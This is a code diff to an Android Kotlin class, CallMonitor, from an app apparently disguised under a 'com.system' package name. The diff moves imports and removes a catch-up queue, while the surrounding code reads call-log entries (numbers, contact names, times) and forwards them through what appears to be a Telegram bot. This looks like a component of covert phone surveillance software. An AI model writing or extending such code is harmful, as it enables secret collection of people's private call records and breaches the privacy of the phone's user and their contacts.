@@ -1,6 +1,6 @@
 package com.system.superiormonitor.monitor
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -12,8 +12,8 @@ import android.os.Looper
 import android.provider.CallLog
 import android.telephony.TelephonyManager
 import com.system.superiormonitor.bot.TelegramApi
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -75,20 +75,14 @@ class CallMonitor(
             }
 
             try {
-                if (prefsManager.callLastProcessedId == -1L) {
-                    val uri = CallLog.Calls.CONTENT_URI
-                    val projection = arrayOf(CallLog.Calls._ID)
-                    // Use _ID DESC to bypass any system clock anomalies
-                    val sortOrder = "${CallLog.Calls._ID} DESC"
-                    context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
-                        if (cursor.moveToFirst()) {
-                            val idIdx = cursor.getColumnIndexOrThrow(CallLog.Calls._ID)
-                            prefsManager.callLastProcessedId = cursor.getLong(idIdx)
-                        }
-                    }
-                } else {
-                    monitorScope.launch {
-                        processLatestCall(isCatchUp = true)
+                val uri = CallLog.Calls.CONTENT_URI
+                val projection = arrayOf(CallLog.Calls._ID)
+                // Use _ID DESC to bypass any system clock anomalies
+                val sortOrder = "${CallLog.Calls._ID} DESC"
+                context.contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
+                    if (cursor.moveToFirst()) {
+                        val idIdx = cursor.getColumnIndexOrThrow(CallLog.Calls._ID)
+                        prefsManager.callLastProcessedId = cursor.getLong(idIdx)
                     }
                 }
             } catch (e: Exception) {
@@ -120,7 +114,7 @@ class CallMonitor(
         }
     }
 
-    private suspend fun processLatestCall(isCatchUp: Boolean = false) {
+    private suspend fun processLatestCall() {
         processMutex.withLock {
         val uri = CallLog.Calls.CONTENT_URI
         val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME)
@@ -161,25 +155,15 @@ class CallMonitor(
                         typeStr, timeStr, safeContactName, safeNumber
                     )
 
-                    if (isCatchUp) {
-                        com.system.superiormonitor.bot.OfflineManager.queueOnly(
-                            context, output, "call_alrt", "offline_calls.txt"
-                        )
-                        LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Queued $typeStr call from $contactName")
-                    } else {
-                        com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
-                            context, output, "call_alrt", "offline_calls.txt", onUpdate
-                        )
-                        LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Processed $typeStr call from $contactName")
-                        delay(3000)
-                    }
+                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+                        context, output, "call_alrt", "offline_calls.txt", onUpdate
+                    )
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Processed $typeStr call from $contactName")
+                    delay(3000)
 
                     if (id > prefsManager.callLastProcessedId) {
                         prefsManager.callLastProcessedId = id
                     }
-                }
-                if (isCatchUp && com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
-                    com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(context, CoroutineScope(Dispatchers.IO))
                 }
             }
         } catch (e: SecurityException) {
